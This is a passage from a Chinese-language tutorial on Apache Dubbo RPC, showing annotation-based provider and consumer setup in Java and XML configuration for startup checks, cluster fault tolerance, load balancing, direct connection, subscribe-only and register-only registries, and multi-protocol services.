<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ProviderConfig：服务提供方配置</span><br><span class="line">ApplicationConfig：应用配置</span><br><span class="line">RegistryConfig：注册中心配置</span><br><span class="line">ProtocolConfig：协议配置</span><br></pre></td></tr></table></figure>
<p>看起来很复杂，其实。。。<br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/7a607c56fd774c65acf83b23b10bc831.png" alt="在这里插入图片描述"><br>
<strong>第三步：启动服务</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.provider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.spring.context.annotation.DubboComponentScan;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.configuration.DubboConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> sun.applet.Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解启动方式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppAnnotation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(DubboConfiguration.class); </span><br><span class="line">        context.start();</span><br><span class="line">        System.in.read(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现输出下面信息就表示  <code>success</code>  了</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/5f2fc6b4d06b48fea91f16dfb130eb70.png" alt="在这里插入图片描述"><br>
<strong>消费端</strong></p>
<p>同样我们下看看消费端的工程，有一个感性认识。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/0ff7a379a9df48e5a08f4669871a8832.png" alt="在这里插入图片描述"><br>
<strong>第一步：引用服务</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.consumer.Annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.annotation.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.service.annotation.ProviderServiceAnnotation;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解方式的service</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component(&quot;annotatedConsumer&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerAnnotationService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span></span><br><span class="line">    <span class="keyword">private</span> ProviderServiceAnnotation providerServiceAnnotation;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doSayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> providerServiceAnnotation.SayHelloAnnotation(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在  <code>ConsumerAnnotationService</code>  类中，通过  <code>@Reference</code>  引用服务端提供的类，然后通过方法调用这个类的方式，给消费端提供接口。</p>
<p>注意：如果这里找不到  <code>ProviderServiceAnnotation</code>  类，请在服务端先把服务端工程用  <code>Maven intall</code>  一下，然后将服务端的依赖放到消费端的 <code>pom</code>  中。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;com.ouyangsihai&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-provider&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>解释一下：引入的 <code>jar</code>  包里面只是未被实现的接口， <code>rpc</code>  需要在客户端服务端定义一套统一的接口，然后在服务端实现接口，实际上还是网络通信，只不过长得像本地实现</p>
<p><strong>第二步：组装服务消费者</strong></p>
<p>这一步和服务端是类似的，这里就不在重复了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.consumer.configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.ConsumerConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.RegistryConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.spring.context.annotation.EnableDubbo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解配置类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableDubbo(scanBasePackages = &quot;com.sihai.dubbo.consumer.Annotation&quot;)</span></span><br><span class="line"><span class="meta">@ComponentScan(value = &#123;&quot;com.sihai.dubbo.consumer.Annotation&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerConfiguration</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">// 应用配置</span></span><br><span class="line">    <span class="keyword">public</span> ApplicationConfig <span class="title function_">applicationConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationConfig</span> <span class="variable">applicationConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationConfig</span>();</span><br><span class="line">        applicationConfig.setName(<span class="string">&quot;dubbo-annotation-consumer&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; stringStringMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        stringStringMap.put(<span class="string">&quot;qos.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        stringStringMap.put(<span class="string">&quot;qos.accept.foreign.ip&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">        stringStringMap.put(<span class="string">&quot;qos.port&quot;</span>,<span class="string">&quot;33333&quot;</span>);</span><br><span class="line">        applicationConfig.setParameters(stringStringMap);</span><br><span class="line">        <span class="keyword">return</span> applicationConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">// 服务消费者配置</span></span><br><span class="line">    <span class="keyword">public</span> ConsumerConfig <span class="title function_">consumerConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ConsumerConfig</span> <span class="variable">consumerConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConsumerConfig</span>();</span><br><span class="line">        consumerConfig.setTimeout(<span class="number">3000</span>);</span><br><span class="line">        <span class="keyword">return</span> consumerConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">// 配置注册中心</span></span><br><span class="line">    <span class="keyword">public</span> RegistryConfig <span class="title function_">registryConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RegistryConfig</span> <span class="variable">registryConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RegistryConfig</span>();</span><br><span class="line">        registryConfig.setProtocol(<span class="string">&quot;zookeeper&quot;</span>);</span><br><span class="line">        registryConfig.setAddress(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">        registryConfig.setPort(<span class="number">2181</span>);</span><br><span class="line">        <span class="keyword">return</span> registryConfig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>第三步：发起远程调用</strong></p>
<p>在 <code>main</code>  方法中通过启动一个 <code>Spring Context</code> ，从其中查找到组装好的 <code>Dubbo</code>  的服务消费者，并发起一次<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8&amp;spm=1001.2101.3001.7020">远程调用</a>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sihai.dubbo.consumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.consumer.Annotation.ConsumerAnnotationService;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.consumer.configuration.ConsumerConfiguration;</span><br><span class="line"><span class="keyword">import</span> com.sihai.dubbo.provider.service.ProviderService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解方式启动</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppAnnotation</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(ConsumerConfiguration.class); </span><br><span class="line">        context.start(); <span class="comment">// 启动</span></span><br><span class="line">        <span class="type">ConsumerAnnotationService</span> <span class="variable">consumerAnnotationService</span> <span class="operator">=</span> context.getBean(ConsumerAnnotationService.class); </span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> consumerAnnotationService.doSayHello(<span class="string">&quot;annotation&quot;</span>); <span class="comment">// 调用方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;result: &quot;</span> + hello); <span class="comment">// 输出结果</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下所示：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/994174d242d84c92a8eb2489b6bc8930.png" alt="在这里插入图片描述"></p>
<h2 id="19-常用场景"><a class="markdownIt-Anchor" href="#19-常用场景">#</a> 1.9 常用场景</h2>
<p>在下面的讲解中，都会是以 <code>xml</code>  配置的方式来讲解的，这也是 <code>dubbo</code>  官方比较推荐的方式。以下的操作都是在服务端的  <code>xml</code>  配置文件和消费端的配置文件来讲解的。</p>
<h3 id="191-启动时检查"><a class="markdownIt-Anchor" href="#191-启动时检查">#</a> 1.9.1 启动时检查</h3>
<p><code>Dubbo</code>  缺省会在启动时检查依赖的服务是否可用，不可用时会抛出异常，阻止  <code>Spring</code>  初始化完成，以便上线时，能及早发现问题，默认 <code>check=&quot;true&quot;</code> 。</p>
<p>但是，有的时候，我们并不是都需要启动时就检查的，比如测试的时候，我们是需要更快速的启动，所以，这种场景的时候，我们是需要关闭这个功能的。</p>
<p>下面，我们看看如何使用这个功能。</p>
<p>在服务端注册的时候（客户端注册时同样适用）；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">protocol</span>=<span class="string">&quot;zookeeper&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2181,localhost:2182,localhost:2183&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>在客户端引用服务端服务的时候；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>就是这么简单，就是这么强！</p>
<h3 id="192-集群容错"><a class="markdownIt-Anchor" href="#192-集群容错">#</a> 1.9.2 集群容错</h3>
<p><code>dubbo</code>  也是支持集群容错的，同时也有很多可选的方案，其中，默认的方案是  <code>failover</code> ，也就是重试机制。</p>
<p>首先，我们先把所有的容错机制都整理一遍，然后再看看使用。</p>
<table>
<thead>
<tr>
<th>集群模式</th>
<th>说明</th>
<th>使用方法</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Failover Cluster</code></td>
<td>失败自动切换，当出现失败，重试其它服务器。通常用于读操作，但重试会带来更长延迟。可通过 <code>retries=&quot;2&quot;</code>  来设置重试次数 (不含第一次)。</td>
<td><code>cluster=&quot;xxx&quot;</code> xxx：集群模式名称 ，例如 <code>cluster=&quot;failover&quot;</code></td>
</tr>
<tr>
<td><code>Failfast Cluster</code></td>
<td>快速失败，只发起一次调用，失败立即报错。通常用于非幂等性的写操作，比如新增记录。</td>
<td></td>
</tr>
<tr>
<td><code>Failsafe Cluster</code></td>
<td>失败安全，出现异常时，直接忽略。</td>
<td></td>
</tr>
<tr>
<td><code>Failback Cluster</code></td>
<td>失败自动恢复，后台记录失败请求，定时重发。通常用于消息通知操作。</td>
<td></td>
</tr>
<tr>
<td><code>Forking Cluster</code></td>
<td>并行调用多个服务器，只要一个成功即返回。通常用于实时性要求较高的读操作，但需要浪费更多服务资源。可通过 <code>forks=&quot;2&quot;</code>  来设置最大并行数。</td>
<td></td>
</tr>
<tr>
<td><code>Broadcast Cluster</code></td>
<td>广播调用所有提供者，逐个调用，任意一台报错则报错。通常用于通知所有提供者更新缓存或日志等本地资源信息。</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>使用实例</strong><br>
在发布服务或者引用服务的时候设置</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--服务发布的配置，需要暴露的服务接口--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="193-负载均衡"><a class="markdownIt-Anchor" href="#193-负载均衡">#</a> 1.9.3 负载均衡</h3>
<p>负载均衡想必是一个再熟悉不过的概念了，所以， <code>dubbo</code>  支持也是再正常不过了，这里也总结一下 <code>dubbo</code>  支持的负载均衡的一些方案及使用方法。</p>
<table>
<thead>
<tr>
<th>负载均衡模式</th>
<th>说明</th>
<th>使用方法</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Random LoadBalance</code></td>
<td>随机 按权重设置随机概率</td>
<td><code>&lt;dubbo:service loadbalance=&quot;xxx&quot;/&gt;</code> xxx：负载均衡方法</td>
</tr>
<tr>
<td><code>RoundRobin LoadBalance</code></td>
<td>轮询 按公约后的权重设置轮询比率。</td>
<td></td>
</tr>
<tr>
<td><code>LeastActive LoadBalance</code></td>
<td>最少活跃调用数 相同活跃数的随机，活跃数指调用前后计数差。</td>
<td></td>
</tr>
<tr>
<td><code>ConsistentHash LoadBalance</code></td>
<td>一致性  <code>Hash</code>  相同参数的请求总是发到同一提供者。 当某一台提供者挂时，原本发往该提供者的请求，基于虚拟节点，平摊到其它提供者，不会引起剧烈变动。</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="194-直连提供者"><a class="markdownIt-Anchor" href="#194-直连提供者">#</a> 1.9.4 直连提供者</h3>
<p>在开发及测试环境下，经常需要绕过注册中心，只测试指定服务提供者，所以，这种情况下，我们只需要直接连接服务端的地即可，其实，这种方法在前面的讲解已经使用到了，第一种讲解的方式就是这种方式，因为这种方式简单。</p>
<p>使用方法如下所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">url</span>=<span class="string">&quot;dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：可以看到，只要在消费端在・ <code>dubbo:reference</code>  节点使用 <code>url</code>  给出服务端的方法即可。</p>
<h3 id="195-只订阅"><a class="markdownIt-Anchor" href="#195-只订阅">#</a> 1.9.5 只订阅</h3>
<p>只订阅就是只能够订阅服务端的服务，而不能够注册。</p>
<p>引用官方的使用场景如下：</p>
<blockquote>
<p>为方便开发测试，经常会在线下共用一个所有服务可用的注册中心，这时，如果一个正在开发中的服务提供者注册，可能会影响消费者不能正常运行。<br>
可以让服务提供者开发方，只订阅服务 (开发的服务可能依赖其它服务)，而不注册正在开发的服务，通过直连测试正在开发的服务。</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">register</span>=<span class="string">&quot;false&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;zookeeper&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2181,localhost:2182,localhost:2183&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>1、使用只订阅方式<br>
当在服务提供端使用  <code>register=&quot;false&quot;</code>  的时候，我们使用下面的方式获取服务端的服务；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>启动信息</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/82d1dafceb4d4562a5bf143dd1bcaed9.png" alt="在这里插入图片描述"><br>
发现，这时候并不是向注册中心  <code>zookeeper</code>  注册，而只是做了发布服务和启动 <code>netty</code> 。</p>
<p>2、不使用只订阅方式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:registry protocol=<span class="string">&quot;zookeeper&quot;</span> address=<span class="string">&quot;localhost:2181,localhost:2182,localhost:2183&quot;</span> check=<span class="string">&quot;false&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
<p>启动信息</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/752b5bf0d635420980b39495b8bf029d.png" alt="在这里插入图片描述"><br>
可以发现，这里就向注册中心  <code>zookeeper</code>  注册了。</p>
<h3 id="196-只注册"><a class="markdownIt-Anchor" href="#196-只注册">#</a> 1.9.6 只注册</h3>
<p>只注册正好跟前面的只订阅相反，这个时候可以向注册中心注册，但是，消费端却不能够读到服务。</p>
<p><strong>应用场景</strong></p>
<blockquote>
<p>如果有两个镜像环境，两个注册中心，有一个服务只在其中一个注册中心有部署，另一个注册中心还没来得及部署，而两个注册中心的其它应用都需要依赖此服务。这个时候，可以让服务提供者方只注册服务到另一注册中心，而不从另一注册中心订阅服务。</p>
</blockquote>
<p><strong>使用说明</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">subscribe</span>=<span class="string">&quot;false&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2181&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">dubbo:registry</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在服务端的  <code>dubbo:registry</code>  节点下使用  <code>subscribe=&quot;false&quot;</code>  来声明这个服务是只注册的服务。</p>
<p>这个时候消费端调用的时候是不能调用的。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/272a429bc9a547108334d08a1188e774.png" alt="在这里插入图片描述"></p>
<h3 id="197-多协议机制"><a class="markdownIt-Anchor" href="#197-多协议机制">#</a> 1.9.7 多协议机制</h3>
<p>在前面我们使用的协议都是  <code>dubbo</code>  协议，但是  <code>dubbo</code>  除了支持这种协议外还支持其他的协议，比如， <code>rmi、hessian</code>  等，另外，而且还可以用多种协议同时暴露一种服务。</p>
<p><strong>使用方法</strong></p>
<p><strong>1、一种接口使用一种协议</strong></p>
<p>先声明多种协议</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--当前服务发布所依赖的协议；webserovice、Thrift、Hessain、http--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;rmi&quot;</span> <span class="attr">port</span>=<span class="string">&quot;1099&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在发布接口的时候使用具体协议</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--服务发布的配置，需要暴露的服务接口--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;rmi&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>在输出日志中，就可以找到 <code>rmi</code>  发布的接口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmi://192.168.234.1:1099/com.sihai.dubbo.provider.service.ProviderService?anyhost=true&amp;application=provider&amp;bean.name=com.sihai.dubbo.provider.service.ProviderService&amp;cluster=failover&amp;dubbo=2.0.2&amp;generic=false&amp;interface=com.sihai.dubbo.provider.service.ProviderService&amp;methods=SayHello&amp;owner=sihai&amp;pid=796&amp;retries=2&amp;side=provider&amp;timestamp=1564281053185, dubbo version: 2.6.6, current host: 192.168.234.1</span><br></pre></td></tr></table></figure>
<p><strong>2、一种接口使用多种协议</strong><br>
声明协议和上面的方式一样，在发布接口的时候有一点不一样。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;rmi,dubbo&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
